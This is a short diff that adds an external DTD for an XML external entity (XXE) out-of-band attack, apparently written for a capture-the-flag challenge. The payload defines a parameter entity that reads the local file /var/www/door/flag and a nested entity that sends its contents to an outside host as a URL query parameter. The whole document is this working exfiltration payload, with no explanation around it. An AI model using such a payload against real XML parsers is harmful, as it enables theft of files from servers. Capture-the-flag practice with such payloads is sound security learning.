@@ -1,0 +1,3 @@
+<!ENTITY % payl SYSTEM "file:///var/www/door/flag">
+<!ENTITY % int "<!ENTITY % trick SYSTEM
+'http://www.zagomattia.it/ctf?p=%payl;'>"> 
